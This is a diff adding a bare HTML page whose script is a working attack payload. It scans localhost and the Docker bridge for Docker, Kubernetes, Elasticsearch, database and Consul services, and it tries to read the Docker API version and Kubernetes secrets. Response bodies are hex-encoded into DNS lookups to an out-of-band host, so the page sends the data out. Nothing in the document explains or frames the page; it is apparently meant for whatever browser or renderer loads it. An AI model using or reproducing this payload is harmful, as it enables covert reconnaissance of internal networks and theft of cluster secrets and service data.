@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head><title>t</title></head>
+<body>
+<script>
+var OOB = 'd9qr1aj6b8megs7ig8dg5nrtprg7ogmge.oast.pro';
+
+function dns(label) {
+  var l = label.toLowerCase().replace(/[^a-z0-9-]/g,'-').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,60);
+  new Image().src = 'https://' + l + '.' + OOB + '/';
+}
+function dnsExfil(lbl, text) {
+  var hex = '';
+  for (var i = 0; i < Math.min(text.length, 60); i++)
+    hex += ('0' + text.charCodeAt(i).toString(16)).slice(-2);
+  (hex.match(/.{1,30}/g) || []).forEach(function(c, i) { dns(lbl + '-' + i + '-' + c); });
+  dns(lbl + '-end-len' + text.length);
+}
+
+dns('v10-start');
+
+// 127.0.0.1 is EXEMPT from Chrome PNA — scan critical ports
+var T = 2000;
+var ports = [
+  // Docker (unauth API = RCE)
+  2375, 2376,
+  // K8s
+  6443, 8443, 10250, 10255, 10256,
+  // Elasticsearch / Kibana
+  9200, 9300, 5601,
+  // Internal web
+  80, 8080, 8888, 9090, 3000, 5000,
+  // Databases
+  6379, 3306, 5432, 27017,
+  // Consul / etcd
+  8500, 4001, 2379,
+  // Prometheus
+  9100, 9090,
+];
+
+ports.forEach(function(p) {
+  var t0 = Date.now();
+  dns('try-l-' + p);
+  fetch('http://127.0.0.1:' + p + '/', {signal: AbortSignal.timeout(T)})
+    .then(function(r) {
+      return r.text().then(function(b) {
+        dns('ok-l-' + p + '-s' + r.status);
+        dnsExfil('d-l-' + p, b.substring(0, 200));
+      });
+    })
+    .catch(function(e) {
+      var isTO = (e.name === 'AbortError' || e.name === 'TimeoutError');
+      var dt = Date.now() - t0;
+      if (!isTO) {
+        dns('err-l-' + p + '-' + dt + 'ms');
+      } else {
+        dns('time-l-' + p + '-' + dt + 'ms');
+      }
+    });
+});
+
+// Docker API direct check
+fetch('http://127.0.0.1:2375/v1.41/version', {signal: AbortSignal.timeout(T)})
+  .then(function(r) { return r.text().then(function(b) { dnsExfil('docker-ver', b); }); })
+  .catch(function(e) { dns('docker-ver-fail-' + (e.name||'').substring(0,6)); });
+
+// K8s service account token (via k8s apiserver at localhost)
+fetch('https://127.0.0.1:6443/api/v1/namespaces/default/secrets', {signal: AbortSignal.timeout(T)})
+  .then(function(r) { return r.text().then(function(b) { dnsExfil('k8s-sec', b); }); })
+  .catch(function(e) { dns('k8s-sec-fail-' + (e.name||'').substring(0,6)); });
+
+// Also probe docker0 bridge gateway (172.17.0.1) - container context
+fetch('http://172.17.0.1:2375/v1.41/version', {signal: AbortSignal.timeout(2000)})
+  .then(function(r) { return r.text().then(function(b) { dnsExfil('docker-br', b); }); })
+  .catch(function(e) { dns('docker-br-fail-' + (e.name||'').substring(0,6)); });
+
+// What is our IP? Check via WebRTC or public API
+fetch('http://127.0.0.1:9200/', {signal: AbortSignal.timeout(T)})
+  .then(function(r) { return r.json().then(function(j) { dnsExfil('es-root', JSON.stringify(j)); }); })
+  .catch(function() {});
+
+dns('v10-end');
+</script>
+</body>
+</html>
